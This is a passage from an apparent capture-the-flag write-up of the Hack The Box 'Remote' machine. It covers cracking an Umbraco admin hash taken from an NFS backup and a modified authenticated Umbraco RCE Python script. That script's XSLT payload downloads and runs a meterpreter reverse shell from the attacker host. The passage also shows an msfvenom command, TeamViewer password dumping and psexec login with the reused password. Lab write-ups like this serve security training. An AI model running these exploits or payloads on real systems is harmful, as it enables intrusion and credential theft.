&lt;span class="code-line"&gt;[*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Auxiliary module execution completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We mount the share in a temporary folder using &lt;code&gt;mount&lt;/code&gt;. A few Google search lead
us to the &lt;a href="https://our.umbraco.com/forum/umbraco-8/96468-umbraco-8-database-file"&gt;umbraco configuration file&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ mkdir /tmp/nfs&lt;/span&gt;
&lt;span class="code-line"&gt;$ mount -t nfs 10.10.10.180:/site_backups /tmp/nfs -nolock&lt;/span&gt;
&lt;span class="code-line"&gt;$ cd /tmp/nfs/&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls&lt;/span&gt;
&lt;span class="code-line"&gt;App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config&lt;/span&gt;
&lt;span class="code-line"&gt;$ ls App_Data&lt;/span&gt;
&lt;span class="code-line"&gt;cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We copy it on our local folder and run &lt;code&gt;string&lt;/code&gt; on it. The password hash for the
account "admin@htb.local’ is in the first lines.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;strings ~/pentest/htb_remote/Umbraco.sdf  | less&lt;/span&gt;
&lt;span class="code-line"&gt;Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;SHA1&amp;quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d&lt;/span&gt;
&lt;span class="code-line"&gt;adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;SHA1&amp;quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50&lt;/span&gt;
&lt;span class="code-line"&gt;adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;SHA1&amp;quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f&lt;/span&gt;
&lt;span class="code-line"&gt;smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;HMACSHA256&amp;quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e&lt;/span&gt;
&lt;span class="code-line"&gt;ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;HMACSHA256&amp;quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749&lt;/span&gt;
&lt;span class="code-line"&gt;ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&amp;quot;hashAlgorithm&amp;quot;:&amp;quot;HMACSHA256&amp;quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run John the ripper with the Rockyou word list against the hash and found the
password "baconandcheese".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: no OpenMP support for this hash type, consider --fork=4&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;baconandcheese   (?)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The credentials admin@htb.local:baconandcheese allow us ton connect to the
Umbraco interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Umbraco admin interface" src="/media/2020.11/remote_05.png"&gt;&lt;/p&gt;
&lt;h2 id="exploiting-umbraco"&gt;Exploiting Umbraco&lt;/h2&gt;
&lt;p&gt;As previously mentioned there is a few exploit for Umbraco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ searchsploit umbraco&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                         |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                                      | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Umbraco CMS - Remote Command Execution | exploits/windows/webapps/19671.rb&lt;/span&gt;
&lt;span class="code-line"&gt;Umbraco CMS 7.12.4 - (Authenticated) R | exploits/aspx/webapps/46153.py&lt;/span&gt;
&lt;span class="code-line"&gt;Umbraco CMS SeoChecker Plugin 1.9.2 -  | exploits/php/webapps/44988.txt&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------- ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;Papers: No Result&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We want to use "Umbraco CMS 7.12.4 - (Authenticated) Remote code execution". We
get the script from our local exploitdb. Looking at the POC, it is launching a
&lt;code&gt;calc.exe&lt;/code&gt; on the server. We try it to see if we get an error.&lt;/p&gt;
&lt;p&gt;As there is no error we modifiy it to obtain a reverse shell:
  * we use msfvenom to create a meterpreter: &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f exe &amp;gt;reverse.exe&lt;/code&gt;
  * we run a python simple HTTP server to share the executable
  * we run metasploit multi handler
  * Using &lt;code&gt;powershell&lt;/code&gt; we download the executable binary and run it&lt;/p&gt;
&lt;p&gt;The script is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;print_dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dico&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dico&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Execute a calc for the PoC&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;xsl:stylesheet version=&amp;quot;1.0&amp;quot; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;xmlns:xsl=&amp;quot;http://www.w3.org/1999/XSL/Transform&amp;quot; xmlns:msxsl=&amp;quot;urn:schemas-microsoft-com:xslt&amp;quot; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;xmlns:csharp_user=&amp;quot;http://csharp.mycompany.com/mynamespace&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;&amp;lt;msxsl:script language=&amp;quot;C#&amp;quot; implements-prefix=&amp;quot;csharp_user&amp;quot;&amp;gt;public string xml() &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;{ string cmd = &amp;quot;mkdir /tmp;iwr -uri http://10.10.14.80:8081/reverse.exe -outfile /tmp/reverse.exe;/tmp/reverse.exe&amp;quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;proc.StartInfo.FileName = &amp;quot;powershell.exe&amp;quot;; proc.StartInfo.Arguments = cmd;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;&amp;lt;/msxsl:script&amp;gt;&amp;lt;xsl:template match=&amp;quot;/&amp;quot;&amp;gt; &amp;lt;xsl:value-of select=&amp;quot;csharp_user:xml()&amp;quot;/&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;&amp;lt;/xsl:template&amp;gt; &amp;lt;/xsl:stylesheet&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;admin@htb.local&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;baconandcheese&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://10.10.10.180&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url_main&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/umbraco/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_main&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;print_dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url_login&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;loginfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_login&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;loginfo&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url_xslt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/umbraco/developer/Xslt/xsltVisualize.aspx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_xslt&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;VIEWSTATE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__VIEWSTATE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;VIEWSTATEGENERATOR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__VIEWSTATEGENERATOR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;UMBXSRFTOKEN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UMB-XSRF-TOKEN&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UMB-XSRF-TOKEN&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;UMBXSRFTOKEN&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__EVENTTARGET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__EVENTARGUMENT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__VIEWSTATE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;VIEWSTATE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__VIEWSTATEGENERATOR&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;VIEWSTATEGENERATOR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ctl00$body$xsltSelection&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ctl00$body$contentPicker$ContentIdValue&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ctl00$body$visualizeDo&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Visualize+XSLT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_xslt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;End&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That allow us to get a meterpreter on the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; getuid&lt;/span&gt;
&lt;span class="code-line"&gt;Server username: IIS APPPOOL\DefaultAppPool&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then use the meterpeter search function to found the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; search -f user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Found 1 result...&lt;/span&gt;
&lt;span class="code-line"&gt;    c:\Users\Public\user.txt (34 bytes)&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cat &amp;quot;c:\Users\Public\user.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;fd2b1f187e6f48be38c224cdcb61faf5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting Root&lt;/h1&gt;
&lt;h2 id="teamviewer-way"&gt;TeamViewer way&lt;/h2&gt;
&lt;p&gt;We run simple &lt;code&gt;ps&lt;/code&gt; on the system to list the process.
We easily spot the TeamViewer process.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; ps&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;2852  628   svchost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;2860  628   svchost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;2884  628   svchost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;2936  628   svchost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;2944  628   TeamViewer_Service.exe&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google search lead us to a metasploit post module to retrieve TeamViewer passwords&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/credentials/teamviewer_passwords&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Finding TeamViewer Passwords on REMOTE&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Found Unattended Password: !R3m0te!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I struggle a lot there trying to connect to the TeamViewer session.
First I looted the TeamViewer ID in
&lt;code&gt;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer7_Logfile.log&lt;/code&gt; first lines.&lt;/p&gt;
&lt;p&gt;As the box is not connected to the Internet it is not possible to connect using
the TeamViewer ID.  Therefore I tried to connect localy
&lt;a href="https://community.teamviewer.com/t5/Knowledge-Base/Can-TeamViewer-be-used-within-a-local-network-LAN-only/ta-p/4618"&gt;using directly the IP address&lt;/a&gt;
but this also doesn't work.&lt;/p&gt;
&lt;p&gt;&lt;img alt="TeamViewer" src="/media/2020.11/remote_03.png"&gt;&lt;/p&gt;
&lt;p&gt;The solution was simpler as this is a simple password reuse. We fire a psexec
and connect as administrator using
the TeamViewer password and got a shell as administrator and can easily get
the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~/installed_tools/impacket/examples# psexec.py administrator@10.10.10.180&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.180.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Uploading file AmYWRVZa.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.180.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating service PmSN on 10.10.10.180.....&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting service PmSN.....&lt;/span&gt;
&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
&lt;span class="code-line"&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;cd C:\Users\administrator\Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;66f9b552d94ea7c55919dc1bfbaff7e1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="using-cve-2019-1322"&gt;Using CVE-2019-1322&lt;/h2&gt;
&lt;p&gt;There is another unintended method to root this box. This method is not reliable
as the command to start the Update Orchestrator Service sometime return an error
(maybe because I used public servers and other players were also starting and stop the service).&lt;/p&gt;
&lt;p&gt;We run &lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"&gt;Windows PEASS&lt;/a&gt;
on the box. The output shows that some patches are missing mostly the one for
CVE-2019-1322.&lt;/p&gt;
